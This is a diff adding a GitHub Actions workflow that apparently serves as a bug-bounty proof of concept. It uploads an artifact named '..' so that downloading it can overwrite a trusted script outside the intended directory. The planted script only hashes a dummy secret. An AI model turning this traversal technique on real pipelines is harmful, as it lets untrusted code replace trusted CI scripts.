@@ -1,0 +1,51 @@
+name: GHBB artifact name parent-path producer
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: Build harmless parent-path artifact payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p parent-artifact/victim safe-artifact/safe
+          cat > parent-artifact/victim/trusted-consumer.sh <<'BASH'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          marker='GHBB-DOWNLOAD-ARTIFACT-PARENT-NAME-20260727'
+          secret_hash="$(printf '%s' "${GHBB_DUMMY_SECRET:?missing dummy secret}" | sha256sum | cut -d' ' -f1)"
+          {
+            printf 'marker=%s\n' "$marker"
+            printf 'dummy_secret_sha256=%s\n' "$secret_hash"
+            printf 'source=untrusted-artifact-name-parent\n'
+          } > "${RUNNER_TEMP}/ghbb-artifact-name-parent-proof.txt"
+          BASH
+          chmod 700 parent-artifact/victim/trusted-consumer.sh
+          printf 'safe_producer_run=%s\n' "$GITHUB_RUN_ID" > safe-artifact/safe/control.txt
+          find parent-artifact safe-artifact -type f -maxdepth 4 -print
+
+      - name: Upload artifact whose valid name is two dots
+        uses: actions/upload-artifact@v7
+        with:
+          name: ".."
+          path: parent-artifact/
+          retention-days: 1
+          if-no-files-found: error
+
+      - name: Upload second artifact to activate per-name destination directories
+        uses: actions/upload-artifact@v7
+        with:
+          name: ghbb-safe-${{ github.run_id }}
+          path: safe-artifact/
+          retention-days: 1
+          if-no-files-found: error
